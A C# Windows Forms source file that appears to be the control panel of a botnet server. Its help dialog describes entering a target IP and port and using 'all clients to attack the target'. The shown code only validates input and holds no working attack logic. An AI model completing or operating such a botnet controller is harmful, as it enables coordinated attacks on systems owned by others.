using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace server
{
	public partial class botnetform : Form
	{
		public static botnetform instance;
		public Form1.Client selected_client;
		private bool running = false;
		public botnetform()
		{
			InitializeComponent();
			instance = this;
		}

		public botnetform(Form1.Client cli)
		{
			InitializeComponent();
			instance = this;
			selected_client = cli;
			systemlabel.Text = "Environment: " + selected_client.environment + " [" +
				selected_client.IP + ":" + selected_client.port.ToString() + "]";
		}

        private void howToToolStripMenuItem_Click(object sender, EventArgs e)
        {
			MessageBox.Show(
				"First box: The IP of the target.\n" +
				"Second box: The target port. \n" +
				"Check box: Use all clients to attack the target.\n" +
				"Always use the Server Log to keep track of your activities.", "How To", MessageBoxButtons.OK, MessageBoxIcon.Information);
		}

        private void actionbtn_Click(object sender, EventArgs e)
        {
			if(!running)
            {
				if (ipbox.Text.Length < 3)
				{
					serverlog.instance.log("The IP address you entered is invalid.\n");
					return;
				}
				int port = int.Parse(portbox.Text);
				if (port > 65535 || port < 1)
				{
					serverlog.instance.log("The port you entered is invalid.\n");
					return;
				}
			}
        }
    }
}
